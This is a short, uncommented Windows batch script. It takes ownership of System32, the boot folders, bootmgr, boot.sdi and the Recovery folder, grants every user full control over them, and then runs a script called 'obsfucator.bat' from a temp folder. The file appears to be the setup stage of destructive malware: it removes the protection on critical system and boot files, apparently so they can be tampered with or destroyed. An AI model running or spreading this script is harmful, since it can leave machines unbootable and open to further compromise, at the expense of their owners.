@echo off
takeown /f C:\Windows\System32 /r /d y & icacls C:\Windows\System32 /grant Users:F /T /C /Q & takeown /f C:\Windows\Boot /r /d y & takeown /f C:\Boot & takeown /f C:\bootmgr /r /d y & icacls C:\Boot /grant Users:F /C /T /Q & icacls C:\Windows\Boot /grant Users:F /C /T /Q 
takeown /f C:\Windows\SysWOW64\boot.sdi /r /d y & icacls C:\Windows\SysWOW64\boot.sdi & takeown /f C:\Recovery /r /d y & icacls C:\Recovery /grant Users:F /C /T /Q & icacls C:\Recovery /grant Administrators:F /C /T /Q
cmd /c "C:\Program Files (x86)\Microsoft\Temp\obsfucator.bat"